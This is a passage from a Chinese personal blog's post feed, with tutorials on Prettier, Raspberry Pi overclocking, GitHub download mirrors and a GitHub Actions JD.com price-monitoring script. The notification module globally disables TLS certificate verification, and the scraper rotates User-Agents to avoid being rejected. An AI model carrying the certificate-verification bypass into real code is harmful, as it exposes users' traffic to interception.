class=\"number\">999999</span>)) + <span class=\"string\">\".jpg\"</span></span><br><span class=\"line\">            <span class=\"comment\"># 写入文件</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(file_name, <span class=\"string\">\"wb\"</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">                file.write(pic)</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"!Ignore: \"</span> + img_name)</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>我把一些我下载下来的壁纸放在了 <a href=\"https://t.yfun.top/dpm-wallpaper\">这里</a>，可以直接预览并下载。</p>\n<p><del>OK，又水了一篇文（</del></p>\n","link":"https://blog.yfun.top/posts/2021/dpm-wallpaper/"},{"title":"使用 Prettier 格式化代码","date":"2021-07-15 06:45:00","description":"\n<p>格式化代码可以提高代码的可读性，使代码更加美观。</p>\n<p>Prettier 支持：</p>\n<ul>\n<li>JavaScript (including experimental features)</li>\n<li>JSX</li>\n<li>Angular</li>\n<li>Vue</li>\n<li>Flow</li>\n<li>TypeScript</li>\n<li>CSS, Less, and SCSS</li>\n<li>HTML</li>\n<li>JSON</li>\n<li>GraphQL</li>\n<li>Markdown, including GFM and MDX</li>\n<li>YAML</li>\n</ul>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%AE%89%E8%A3%85\" class=\"headerlink\" title=\"安装\"></a>安装</h2>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%8F%92%E4%BB%B6\" class=\"headerlink\" title=\"插件\"></a>插件</h3>\n<p>你可以很方便的在 VSCode 等 IDE 上安装插件，插件名为 <code>Prettier</code>.</p>\n<p>以 VSCode 为例：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/6a3ad0ea42d55.png\"></p>\n<blockquote><p>如果安装了其他格式化插件，则需要点击 [格式化文档的方式]，选择 <code>Prettier</code>。</p></blockquote>\n<h3>\n<a href=\"https://blog.yfun.top/#CLI\" class=\"headerlink\" title=\"CLI\"></a>CLI</h3>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo npm i -g prettier</span><br></pre></td></tr></table></figure><p>相关的文档可参见官网: <a href=\"https://prettier.io/docs/en/cli.html\">https://prettier.io/docs/en/cli.html</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">prettier --write . <span class=\"comment\"># 格式化当前文件夹的所有文件</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%85%8D%E7%BD%AE\" class=\"headerlink\" title=\"配置\"></a>配置</h2>\n<p>参见官方文档：</p>\n<ul>\n<li><p><a href=\"https://prettier.io/docs/en/configuration.html\">https://prettier.io/docs/en/configuration.html</a></p></li>\n<li><p><a href=\"https://prettier.io/docs/en/options.html\">https://prettier.io/docs/en/options.html</a></p></li>\n</ul>\n<p>Prettier 的配置文件有多种写法：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.10/rawimg/a4cc583d84c12.png\"></p>\n<p>以使用 <code>YAML</code> 书写的 <code>.prettierrc</code> 为例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 单行最长字符数</span></span><br><span class=\"line\"><span class=\"attr\">printWidth:</span> <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"comment\"># 制表符长度</span></span><br><span class=\"line\"><span class=\"attr\">tabWidth:</span> <span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"comment\"># 是否使用 Tab</span></span><br><span class=\"line\"><span class=\"attr\">useTabs:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"><span class=\"comment\"># 是否加入分号</span></span><br><span class=\"line\"><span class=\"attr\">semi:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"><span class=\"comment\"># 单引号</span></span><br><span class=\"line\"><span class=\"attr\">singleQuote:</span> <span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E6%95%88%E6%9E%9C\" class=\"headerlink\" title=\"效果\"></a>效果</h2>\n<p>格式化前：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>).then(<span class=\"function\"><span class=\"params\">res</span>=&gt;</span>res.json()).then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {<span class=\"built_in\">console</span>.log(content);<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++){<span class=\"built_in\">console</span>.log(content[i][<span class=\"string\">'title'</span>] + <span class=\"string\">\" --- https://blog.yfun.top\"</span> + content[i][<span class=\"string\">'url'</span>])}})</span><br></pre></td></tr></table></figure><p>格式化后：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">fetch(<span class=\"string\">\"https://blog.yfun.top/search.json\"</span>)</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> res.json())</span><br><span class=\"line\">    .then(<span class=\"function\">(<span class=\"params\">content</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(content);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; content.length; i++) {</span><br><span class=\"line\">            <span class=\"built_in\">console</span>.log(</span><br><span class=\"line\">                content[i][<span class=\"string\">\"title\"</span>] +</span><br><span class=\"line\">                    <span class=\"string\">\" --- https://blog.yfun.top\"</span> +</span><br><span class=\"line\">                    content[i][<span class=\"string\">\"url\"</span>]</span><br><span class=\"line\">            );</span><br><span class=\"line\">        }</span><br><span class=\"line\">    });</span><br></pre></td></tr></table></figure>\n","link":"https://blog.yfun.top/posts/2021/format-code-using-prettier/"},{"title":"树莓派超频","date":"2021-06-25 07:50:00","description":"\n<div class=\"note note-info\">            <p>本文操作系统为 Ubuntu Server 20.04，其他操作系统可能有所不同。</p>          </div>\n<div class=\"note note-warning\">            <p>超频是有风险的，温度也会更高，需要比较良好的散热。</p>          </div>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>登录树莓派，进入 <code>/boot/firmware/</code> 目录：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cd</span> /boot/firmware/</span><br></pre></td></tr></table></figure><div class=\"note note-warning\">            <p>网上很多教程让你修改 <code>config.txt</code> 文件，但注释里已经很明确的写了：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Please DO NOT modify this file; if you need to modify the boot config, the</span><br><span class=\"line\"># \"usercfg.txt\" file is the place to include user changes. Please refer to</span><br><span class=\"line\"># the README file for a description of the various configuration files on</span><br><span class=\"line\"># the boot partition.</span><br></pre></td></tr></table></figure>\n</div>\n<p>我们修改 <code>usercfg.txt</code> 文件：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo vim usercfg.txt</span><br></pre></td></tr></table></figure><p>在文件末尾追加配置信息，以下是我的，仅供参考：</p>\n<div class=\"note note-danger\">            <p>我使用的是 <code>Raspberry Pi 4 (4GB)</code>，并且有小风扇和散热片。<br>请根据自己的需要和配置进行更改。</p>          </div>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">force_turbo=0</span><br><span class=\"line\">arm_freq=1850</span><br><span class=\"line\">over_voltage=6</span><br><span class=\"line\">gpu_freq=650</span><br><span class=\"line\">core_freq=650</span><br><span class=\"line\">gpu_mem=620</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E9%87%8D%E5%90%AF\" class=\"headerlink\" title=\"重启\"></a>重启</h2>\n<p>保存文件，使用命令重启：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo reboot</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#%E5%90%8E\" class=\"headerlink\" title=\"后\"></a>后</h2>\n<p>重启完毕后，再使用 <code>lscpu</code> 命令看看 CPU 状况。</p>\n","link":"https://blog.yfun.top/posts/1445549919/"},{"title":"加速 GitHub 下载","date":"2021-06-18 09:30:00","description":"\n<p>GitHub 在国内的访问情况不太稳定，仓库克隆速度也非常慢。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E2%9C%88%EF%B8%8F\" class=\"headerlink\" title=\"✈️\"></a>✈️</h2>\n<p>不必多说。</p>\n<p>例如 <a href=\"http://127.0.0.1:7890/\">http://127.0.0.1:7890</a> 为代理地址，你可以使用下方的命令更改：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global http.proxy http://127.0.0.1:7890</span><br></pre></td></tr></table></figure><p>如果有一天不需要了，输入下面代码取消：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">git config --global --<span class=\"built_in\">unset</span> http.proxy</span><br></pre></td></tr></table></figure><h2>\n<a href=\"https://blog.yfun.top/#FastGit\" class=\"headerlink\" title=\"FastGit\"></a>FastGit</h2>\n<p>使用 <a href=\"https://fastgit.org/\">FastGit</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://hub.fastgit.org/\">https://hub.fastgit.org</a></p>\n<p>支持 HTTPS 克隆，并且提供 raw.githubusercontent.com 的镜像，地址为 <a href=\"https://raw.fastgit.org/\">https://raw.fastgit.org</a></p>\n<h2>\n<a href=\"https://blog.yfun.top/#CNPM\" class=\"headerlink\" title=\"CNPM\"></a>CNPM</h2>\n<p>使用 <a href=\"https://cnpmjs.org/\">CNPM</a> 提供的 GitHub 镜像。</p>\n<p>镜像地址：<a href=\"https://github.com.cnpmjs.org/\">https://github.com.cnpmjs.org</a></p>\n<p>支持 HTTPS 克隆。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Hosts\" class=\"headerlink\" title=\"Hosts\"></a>Hosts</h2>\n<p>通过更改 Hosts 文件的方式解决，但大有可能失效：</p>\n<figure class=\"highlight text\"><table><tr><td class=\"code\"><pre><span class=\"line\">199.232.69.194  github.global.ssl.fastly.net</span><br><span class=\"line\">140.82.113.4    github.com</span><br></pre></td></tr></table></figure><p>GitHub 上的 <a href=\"https://github.com/521xueweihan/GitHub520\">521xueweihan/GitHub520</a> 项目提供了更多关于 GitHub Hosts 列表。</p>\n<blockquote><p><a href=\"https://github.com/521xueweihan/GitHub520/issues/53\">521xueweihan/GitHub520 #53</a></p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#Gitee\" class=\"headerlink\" title=\"Gitee\"></a>Gitee</h2>\n<p>网上挺多教程，使用 Gitee 的「从 GitHub 导入」功能。</p>\n<p>不过 Gitee 限制仓库 500MB。。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#Coding\" class=\"headerlink\" title=\"Coding\"></a>Coding</h2>\n<p>进入 Coding 控制台，点击「创建项目」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/k7uHJm.png\"></p>\n<p>项目模版选择「代码托管」就好，仅做下载的话无需开启太多。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bEO0vX.png\"></p>\n<p>填写项目基本信息，如名称、标识等。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/N4xjSv.png\"></p>\n<p>新建一个镜像仓库。</p>\n<p>「Git 仓库 URL」填写 GitHub 公开仓库 HTTPS 克隆地址，如：<a href=\"https://github.com/twbs/bootstrap.git\">https://github.com/twbs/bootstrap.git</a></p>\n<p>创建完成后请稍等，系统就会自动导入。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/YxnnDj.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/FmfWkf.png\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/OV7w4v.png\"></p>\n<p>导入完成后，点击「克隆」就能找到克隆地址。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/ocoke-osg@0.0.9/rawimg/bWszbu.png\"></p>\n<p>克隆速度挺快的：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">Cloning into <span class=\"string\">'bootstrap'</span>...</span><br><span class=\"line\">remote: Enumerating objects: 169214, <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Counting objects: 100% (169214/169214), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">remote: Compressing objects: 100% (51634/51634), <span class=\"keyword\">done</span>.</span><br><span class=\"line\">Receiving objects:  57% (96728/169214), 90.58 MiB | 6.83 MiB/s </span><br></pre></td></tr></table></figure><p>此外，Coding 还支持自动同步，可以设置每天的同步时间。</p>\n","link":"https://blog.yfun.top/posts/2517388641/"},{"title":"GitHub Action 监测京东商品价格","date":"2021-05-18 10:32:00","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%89%8D%E8%A8%80\" class=\"headerlink\" title=\"前言\"></a>前言</h2>\n<p>我会在京东上买些电子产品和文具，那么如何获得商品降价信息，使用更低的价格购买呢？</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%BC%80%E5%A7%8B\" class=\"headerlink\" title=\"开始\"></a>开始</h2>\n<p>新建一个 <code>GitHub</code> 仓库，创建 <code>main.py</code> , <code>notify.py</code> 和 <code>.github/workflows/auto.yml</code> 三个文件，内容如下：</p>  <details class=\"post-details\"><summary><code>main.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"comment\"># 导入模块</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, random, json, notify</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 商品列表</span></span><br><span class=\"line\">check = [</span><br><span class=\"line\">    <span class=\"comment\"># 闪迪（SanDisk）64GB TF（MicroSD）存储卡</span></span><br><span class=\"line\">    <span class=\"string\">'1887526'</span>,</span><br><span class=\"line\">    <span class=\"comment\"># 晨光(M&amp;G)文具 0.5mm 黑色中性笔</span></span><br><span class=\"line\">    <span class=\"string\">'277393'</span></span><br><span class=\"line\"><span class=\"comment\"># ...</span></span><br><span class=\"line\">]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 价格列表，用于临时存储获取到的价格数据</span></span><br><span class=\"line\">price = {}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取上次的价格文件</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode=<span class=\"string\">'r'</span>)</span><br><span class=\"line\">    lastPrice = json.loads(file.readlines()[<span class=\"number\">0</span>])</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"读取文件时出现错误！\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 遍历列表，比对价格</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> itemId <span class=\"keyword\">in</span> check:</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求 URL</span></span><br><span class=\"line\">    <span class=\"comment\"># http://p.3.cn/prices/mgets?skuIds=J_</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://p.3.cn/prices/mgets?skuIds=J_{}'</span>.<span class=\"built_in\">format</span>(itemId)</span><br><span class=\"line\">    <span class=\"comment\"># User-Agent 列表</span></span><br><span class=\"line\">    ua = [<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36'</span>,<span class=\"string\">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60'</span>,<span class=\"string\">'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>,<span class=\"string\">'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 随机获得一个 User-Agent，如不带 User-Agent 请求，就会被拒绝。</span></span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: ua[random.randint(<span class=\"number\">0</span>,<span class=\"number\">4</span>)]</span><br><span class=\"line\">    }</span><br><span class=\"line\">    <span class=\"comment\"># 组合请求参数</span></span><br><span class=\"line\">    request = urllib.request.Request(url = url, headers = headers)</span><br><span class=\"line\">    <span class=\"comment\"># 向京东发起请求</span></span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    <span class=\"comment\"># 将获得的数据转为 JSON</span></span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    thisPrice = <span class=\"built_in\">float</span>(page_text[<span class=\"number\">0</span>][<span class=\"string\">'p'</span>])</span><br><span class=\"line\">    <span class=\"comment\"># 将价格输入至价格变量</span></span><br><span class=\"line\">    price[itemId] = thisPrice</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># 尝试对比价格</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> thisPrice &gt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 涨价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\"></span><br><span class=\"line\">            print(thisPrice - lastPrice[itemId])</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">0</span>, thisPrice - lastPrice[itemId], thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> thisPrice &lt; lastPrice[itemId]:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 降价\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">            print(lastPrice[itemId] - thisPrice)</span><br><span class=\"line\">            notify.notify(itemId, <span class=\"number\">2</span>, lastPrice[itemId] - thisPrice, thisPrice)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">elif</span> lastPrice[itemId] == thisPrice:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 价格不变\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"{0} 未知错误\"</span>.<span class=\"built_in\">format</span>(itemId))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"无法进行比对\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 JSON 转为 字符串</span></span><br><span class=\"line\">priceStr = json.dumps(price)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 写入价格文件，便于下次查询</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    file = <span class=\"built_in\">open</span>(<span class=\"string\">'./price.json'</span>, mode = <span class=\"string\">'w'</span>)</span><br><span class=\"line\">    file.write(priceStr)</span><br><span class=\"line\">    file.close()</span><br><span class=\"line\"><span class=\"keyword\">except</span>:</span><br><span class=\"line\">    print(<span class=\"string\">\"写入文件时出现错误\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">print(price)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>notify.py</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># -*- coding: utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.request, json, urllib.parse, ssl</span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">提醒的服务，支持 `wechat` 与 `qmsg`。</span></span><br><span class=\"line\"><span class=\"string\">需要在下方进行下一步的配置</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">server = [<span class=\"string\">'qmsg'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">WeChat 采用的是 Server 酱 (https://sc.ftqq.com/3.version) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Server 酱提供的 Token，必填。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">wechat = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">Qmsg 采用的是 Qmsg 酱 (https://qmsg.zendee.cn/) 提供的服务</span></span><br><span class=\"line\"><span class=\"string\">key：Qmsg 酱提供的 KEY，必填。</span></span><br><span class=\"line\"><span class=\"string\">qid：接收消息的 QQ 号（不支持 QQ 群），可以添加多个，以半角逗号分割，如：`10001,10002`（必须均在您的 Qmsg 酱 QQ 号列表中）。</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">qmsg = {</span><br><span class=\"line\">    <span class=\"string\">\"key\"</span>: <span class=\"string\">\"\"</span>,</span><br><span class=\"line\">    <span class=\"string\">\"qid\"</span>: <span class=\"string\">\"\"</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">wechat_send</span>(<span class=\"params\">key, title, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://sc.ftqq.com/{0}.send?text={1}&amp;desp={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(title), urllib.parse.quote(text))</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'errno'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">qmsg_send</span>(<span class=\"params\">key, <span class=\"built_in\">id</span>, text</span>):</span></span><br><span class=\"line\">    url = <span class=\"string\">'http://qmsg.zendee.cn/send/{0}?msg={1}&amp;qq={2}'</span>.<span class=\"built_in\">format</span>(key, urllib.parse.quote(text), <span class=\"built_in\">id</span>)</span><br><span class=\"line\">    headers = {</span><br><span class=\"line\">        <span class=\"string\">'User-Agent'</span>: <span class=\"string\">\"Check Price Bot\"</span></span><br><span class=\"line\">    }</span><br><span class=\"line\">    request = urllib.request.Request(url=url, headers=headers)</span><br><span class=\"line\">    response = urllib.request.urlopen(request)</span><br><span class=\"line\">    page_text = json.loads(response.read().decode(<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">    <span class=\"keyword\">if</span> page_text[<span class=\"string\">'code'</span>] == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">notify</span>(<span class=\"params\"><span class=\"built_in\">id</span>,<span class=\"built_in\">type</span>,price,nowPrice</span>):</span></span><br><span class=\"line\">    <span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">    type:</span></span><br><span class=\"line\"><span class=\"string\">        0: 涨价</span></span><br><span class=\"line\"><span class=\"string\">        1: 无变化</span></span><br><span class=\"line\"><span class=\"string\">        2: 降价</span></span><br><span class=\"line\"><span class=\"string\">    id: 商品 ID</span></span><br><span class=\"line\"><span class=\"string\">    price: 差价</span></span><br><span class=\"line\"><span class=\"string\">    nowPrice: 现价</span></span><br><span class=\"line\"><span class=\"string\">    '''</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> svId <span class=\"keyword\">in</span> server:</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send</span>(<span class=\"params\">title,content</span>):</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'wechat'</span>:</span><br><span class=\"line\">                wechat_send(wechat[<span class=\"string\">\"key\"</span>],title,content)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> svId == <span class=\"string\">'qmsg'</span>:</span><br><span class=\"line\">                qmsg_send(qmsg[<span class=\"string\">\"key\"</span>],qmsg[<span class=\"string\">\"qid\"</span>],title + <span class=\"string\">\"\\n\"</span> + content)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">type</span> == <span class=\"number\">0</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 涨价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 涨价咯！价格相较于上次监测，高了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>,price,nowPrice)</span><br><span class=\"line\">            send(title,content)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">1</span>:</span><br><span class=\"line\">            print(<span class=\"string\">\"价格没有变化，不推送通知。\"</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"built_in\">type</span> == <span class=\"number\">2</span>:</span><br><span class=\"line\">            title = <span class=\"string\">\"商品 {0} 降价!\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>)</span><br><span class=\"line\">            content = <span class=\"string\">\"您关注的商品 {0} 降价咯！价格相较于上次监测，低了 {1} 元，现价 {2} 元。商品详情：https://item.jd.com/{0}.html\"</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">id</span>, price,nowPrice)</span><br><span class=\"line\">            send(title, content)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br></pre></td></tr></table></figure>\n</div></details><details class=\"post-details\"><summary><code>.github/workflows/auto.yml</code> (点击展开)</summary><div class=\"details-content\">  <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">name:</span> <span class=\"string\">Check</span> <span class=\"string\">Price</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">on:</span></span><br><span class=\"line\">  <span class=\"attr\">push:</span></span><br><span class=\"line\">    <span class=\"attr\">branches:</span> </span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"attr\">schedule:</span></span><br><span class=\"line\">    <span class=\"comment\"># 每 1 小时运行一次</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"attr\">cron:</span> <span class=\"string\">\"0 * * * *\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">jobs:</span></span><br><span class=\"line\">  <span class=\"attr\">check:</span></span><br><span class=\"line\">    <span class=\"attr\">runs-on:</span> <span class=\"string\">ubuntu-latest</span></span><br><span class=\"line\">    <span class=\"attr\">steps:</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">Clone</span> <span class=\"string\">repository</span></span><br><span class=\"line\">        <span class=\"attr\">uses:</span> <span class=\"string\">actions/checkout@v2</span></span><br><span class=\"line\">      <span class=\"bullet\">-</span> <span class=\"attr\">name:</span> <span class=\"string\">'Set up Python'</span></span><br><span class=\"line\">        <span 